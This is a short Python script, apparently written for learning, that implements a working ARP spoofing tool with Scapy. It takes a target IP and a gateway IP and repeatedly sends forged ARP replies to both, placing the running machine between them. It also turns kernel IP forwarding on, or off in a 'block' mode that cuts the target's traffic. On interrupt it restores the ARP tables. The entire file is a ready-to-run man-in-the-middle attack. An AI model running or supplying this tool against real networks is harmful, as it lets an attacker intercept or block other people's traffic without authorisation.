#!/usr/bin/env python
"""
Simple ARP Spoof program built with Scapy.
"""

__author__ = "Lucca Paffi"

import time
import scapy.all as scapy
import optparse
import subprocess


# Helper function to parse CLI arguments
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP Address")
    parser.add_option("-s", "--spoof", dest="spoof", help="Spoofed IP Address (Usually the gateway)")
    parser.add_option("-b", "--block", dest="block", action='store_true',
                      help="Block packet forwarding to the target machine")
    parser.add_option("-a", "--allow", dest="allow", action='store_true',
                      help="Allow packet forward to the target machine (default)")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target, use --help for more info ")
    else:
        return options


# Helper function to get MAC Address using the IP Address
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


# op = 2 => Scapy parameter to send the packet as a response (avoids validation)
# target_ip = IP of the machine we're trying to spoof
# spoof_ip = IP to be cloned/spoofed
# The machine receiving this packet will associate the ip of the router (psrc) with the spoofed mac address (hwdst)
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def allow_forward():
    ip_forward_file = open("/proc/sys/net/ipv4/ip_forward", "w")
    ip_forward_file.write("1")
    ip_forward_file.close()


def block_forward():
    ip_forward_file = open("/proc/sys/net/ipv4/ip_forward", "w")
    ip_forward_file.write("0")
    ip_forward_file.close()


# Restores the ARP Table to it's initial state.
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def main():
    sent_packets_count = 0
    options = get_arguments()
    target_ip = options.target
    spoofed_ip = options.spoof
    if options.block:
        block_forward()
        print("[+] Packet forwarding is blocked")
    else:
        allow_forward()
        print("[+] Packet forwarding is allowed")
    try:
        while True:
            # Tells the target we're the router
            spoof(target_ip, spoofed_ip)

            # Tells the router we'are the target computer
            spoof(spoofed_ip, target_ip)

            sent_packets_count = sent_packets_count + 2
            print("\r[+] Packets sent: " + str(sent_packets_count), end="")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Quitting ... Resetting ARP Tables")
        restore(target_ip, spoofed_ip)
        restore(spoofed_ip, target_ip)


main()
